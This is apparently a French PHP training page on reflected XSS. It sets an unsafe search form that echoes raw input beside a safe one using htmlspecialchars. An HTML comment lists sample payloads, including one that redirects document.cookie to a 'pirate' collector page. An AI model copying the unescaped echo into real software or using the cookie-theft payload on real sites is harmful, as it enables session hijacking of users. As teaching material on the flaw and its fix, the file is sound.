<?php
session_start();
$_SESSION["user"] = "Pirate";
$_SESSION["USER_AGENT"] = $_SERVER["HTTP_USER_AGENT"];
var_dump($_SESSION);
//var_dump($_SERVER);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <h1>Faille XSS</h1>


    <!--
    coucou
    <h1>Coucou</h1>
    <script>alert("Coucou la faille XSS ?");</script>
    <script>alert("Cookies = " + document.cookie);</script>
    <script>console.log("Cookies = " + document.cookie);</script>
    <script>window.location.replace("http://localhost/formation/next2025/next2025-php/security/xss/xss_pirate.php?cookies=" + document.cookie);</script>
    <img src="aaaaa" onerror="alert('Idem sans balise script');">
    -->
    <?php
    if (isset($_POST["keyword"]) && !empty($_POST["keyword"])) {
        echo "<h2>Site non sécurisé</h2>";
        echo "Résultat(s) pour le mot clé : " . $_POST["keyword"];
    }

    if (isset($_POST["keyword2"]) && !empty($_POST["keyword2"])) {
        echo "<h2>Site sécurisé</h2>";
        $_POST["keyword2"] = htmlspecialchars($_POST["keyword2"], ENT_QUOTES);
        echo "Résultat(s) pour le mot clé : " . $_POST["keyword2"];
    }

    ?>

    <h2>Non sécurisé</h2>
    <form action="" method="post">
        <input type="text" name="keyword" size="150">
        <input type="submit" value="Rechercher">
    </form>

    <h2>Sécurisé</h2>
    <form action="" method="post">
        <input type="text" name="keyword2" size="150">
        <input type="submit" value="Rechercher">
    </form>

</body>
</html>